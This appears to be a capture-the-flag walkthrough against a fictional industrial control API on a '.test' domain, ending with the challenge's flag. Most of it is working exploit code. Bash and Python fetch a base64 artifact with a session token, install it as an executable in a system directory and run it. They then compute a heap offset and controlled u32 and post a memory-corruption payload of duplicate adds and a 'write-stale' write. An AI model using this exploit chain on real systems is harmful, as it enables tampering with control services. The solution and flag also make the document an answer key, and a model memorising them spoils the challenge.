## Prerequisite

## Fetch the estimator baseline and run its reproducer

The baseline returns a reproducer artifact. Run it twice to read the heap layout:
`--ordinary` prints the per-district baseline reserves; `--reproduce` prints the
stale and replacement allocation snapshots, the probe id, and the allocation case.

```bash
PROCESS=$(cat receipts/process-session)
PV=https://process-view.arwc.test
curl -sk --cacert /tmp/arwc-ca.crt -H "Authorization: Bearer $PROCESS" -H "X-ARWC-Tenant: arwc" \
  -H "Content-Type: application/json" -d '{"estimator":"EST-CRR-23","mode":"baseline"}' -X POST \
  "$PV/api/control-commands" -o /tmp/w23base.json
python3 - <<'PY'
import json, base64, hashlib
d = json.load(open("/tmp/w23base.json"))
print("flag(baseline step):", d.get("flag"))
art = base64.b64decode(d["artifact_b64"], validate=True)
assert hashlib.sha256(art).hexdigest() == d["record"]["sha256"]
open("/var/lib/fieldlink-connector/estimator23", "wb").write(art)
import os; os.chmod("/var/lib/fieldlink-connector/estimator23", 0o700)
PY
/var/lib/fieldlink-connector/estimator23 --ordinary  > /tmp/w23ord.txt
/var/lib/fieldlink-connector/estimator23 --reproduce > /tmp/w23rep.txt
```

## Derive the heap layout and submit the exploit

Parse the reproducer snapshots: the single changed run of bytes in `stale` is the
controlled u32 field; the reserve and quality values locate their offsets in
`replacement`. The exploit adds the duplicate measurement twice, adds the probe,
and writes the controlled u32 at its offset. A wrong offset (65) is rejected (409).

```bash
BODY=$(python3 - <<'PY'
import json, struct
district = "Cairn Reach"
ordinary = {k: (v if k == "quality" else float(v))
            for k, v in (f.split("=", 1) for f in open("/tmp/w23ord.txt").read().split()[1:])}
fields = dict(l.split("=", 1) for l in open("/tmp/w23rep.txt").read().splitlines() if "=" in l)
stale = bytes.fromhex(fields["stale"]); replacement = bytes.fromhex(fields["replacement"])
probe = fields["probe"]; allocation_case = fields["case"]
controlled = [i for i, v in enumerate(stale) if v]
controlled_offset = controlled[0]
controlled_u32 = struct.unpack("<I", stale[controlled_offset:controlled[-1] + 1])[0]
ordinary_key = next(k for k in ordinary if district.startswith(str(k)))
instrument_b = "FIT-CRR-204B"
exploit = {"estimator": "EST-CRR-23", "operations": [
    {"op": "add", "source_id": instrument_b, "value": ordinary[ordinary_key]},
    {"op": "add", "source_id": instrument_b, "value": ordinary[ordinary_key]},
    {"op": "add", "source_id": probe, "value": 0.0},
    {"op": "write-stale", "source_id": instrument_b, "offset": controlled_offset, "u32": controlled_u32},
]}
print(json.dumps(exploit))
PY
)
curl -sk --cacert /tmp/arwc-ca.crt -H "Authorization: Bearer $PROCESS" -H "X-ARWC-Tenant: arwc" \
  -H "Content-Type: application/json" -d "$BODY" -X POST "$PV/api/control-commands"
```

```json
{"audit_id":"...","flag":"FLAG{0b6fa11278a4c58e}","record":{"controlled_offset":64,"estimator_usable":true,...}}
```

On this scenario `controlled_offset` is 64 and `controlled_u32` is 1129468466.
The response `record.estimator_usable` is `true`. The flag is in the top-level
`flag` field.
